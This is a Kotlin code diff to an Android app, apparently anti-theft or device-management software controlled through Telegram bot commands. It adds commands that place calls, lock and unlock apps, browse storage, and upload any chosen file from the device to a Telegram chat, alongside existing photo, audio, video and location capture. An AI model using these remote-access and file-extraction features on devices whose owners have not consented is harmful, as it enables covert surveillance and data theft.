@@ -98,7 +98,10 @@ class CommandExecutor @Inject constructor(
     private val peripheralLockCommand: com.izhaanintellect.pasa.commands.PeripheralLockCommand,
     private val lockscreenInfoCommand: com.izhaanintellect.pasa.commands.LockscreenInfoCommand,
     private val wifiProvisionCommand: com.izhaanintellect.pasa.commands.WifiProvisionCommand,
-    private val securityAuditCommand: com.izhaanintellect.pasa.commands.SecurityAuditCommand
+    private val securityAuditCommand: com.izhaanintellect.pasa.commands.SecurityAuditCommand,
+    private val callCommand: com.izhaanintellect.pasa.commands.CallCommand,
+    private val appLockCommand: com.izhaanintellect.pasa.commands.AppLockCommand,
+    private val storageAccessCommand: com.izhaanintellect.pasa.commands.StorageAccessCommand
 ) {
     companion object {
         private const val TAG = "PASA_Executor"
@@ -165,6 +168,13 @@ class CommandExecutor @Inject constructor(
                 if (file.exists() && file.length() > 0) {
                     val (encFile, _) = enqueueAndEncryptEvidence(null, file, "VIDEO")
                     sendVideo(parsed.chatId, encFile, "🎥 Captured video")
+                }
+            }
+
+            // Deliver document/file if extracted
+            result.documentFile?.let { file ->
+                if (file.exists() && file.length() > 0) {
+                    sendDocument(parsed.chatId, file, "📄 ${file.name}")
                 }
             }
 
@@ -304,6 +314,7 @@ class CommandExecutor @Inject constructor(
                 photo?.let { sendPhoto(parsed.chatId, it, "📸 Captured photo") }
                 audio?.let { sendAudio(parsed.chatId, it, "🎙️ Audio recording") }
                 video?.let { sendVideo(parsed.chatId, it, "🎥 Captured video") }
+                result.documentFile?.let { sendDocument(parsed.chatId, it, "📄 ${it.name}") }
                 result.location?.let { (lat, lng) -> sendLocation(parsed.chatId, lat, lng) }
             }
 
@@ -557,6 +568,27 @@ class CommandExecutor @Inject constructor(
             }
             "/wifi_connect", "/wifi_provision", "/connect_wifi" -> wifiProvisionCommand
             "/security_audit", "/audit_logs", "/sec_audit" -> securityAuditCommand
+            "/call", "/dial", "/phone_call" -> callCommand
+            "/lock_app", "/app_lock" -> appLockCommand
+            "/unlock_app", "/app_unlock" -> object : Command {
+                override val name = "/unlock_app"
+                override val description = "Unlock/restore application [Device Owner]"
+                override val usage = "/unlock_app <gallery|phone|files|target>"
+                override suspend fun execute(args: List<String>, chatId: Long) = appLockCommand.executeUnlock(args)
+            }
+            "/gallery_latest", "/gallery", "/photos_latest" -> storageAccessCommand
+            "/getfile", "/download_file", "/file_download" -> object : Command {
+                override val name = "/getfile"
+                override val description = "Extract file from storage directly to Telegram"
+                override val usage = "/getfile <path>"
+                override suspend fun execute(args: List<String>, chatId: Long) = storageAccessCommand.executeGetFile(args, chatId)
+            }
+            "/list_files", "/ls", "/browse_files" -> object : Command {
+                override val name = "/list_files"
+                override val description = "List files in storage directory"
+                override val usage = "/list_files [dir]"
+                override suspend fun execute(args: List<String>, chatId: Long) = storageAccessCommand.executeListFiles(args)
+            }
             "/sms_help", "/smscommands", "/smshelp", "/sms_guide" -> object : Command {
                 override val name = "/sms_help"
                 override val description = "Air-gapped cellular SMS command manual & cheat sheet"
@@ -565,6 +597,24 @@ class CommandExecutor @Inject constructor(
             }
             "/help", "/start" -> helpCommand
             else -> null
+        }
+    }
+
+    private suspend fun sendDocument(chatId: Long, file: File, caption: String) {
+        try {
+            val chatIdBody = chatId.toString().toRequestBody("text/plain".toMediaTypeOrNull())
+            val captionBody = caption.toRequestBody("text/plain".toMediaTypeOrNull())
+            val fileBody = file.asRequestBody("application/octet-stream".toMediaTypeOrNull())
+            val part = MultipartBody.Part.createFormData("document", file.name, fileBody)
+
+            telegramApi.sendDocument(
+                token = preferencesManager.botToken,
+                chatId = chatIdBody,
+                document = part,
+                caption = captionBody
+            )
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to upload document: ${e.message}", e)
         }
     }
 
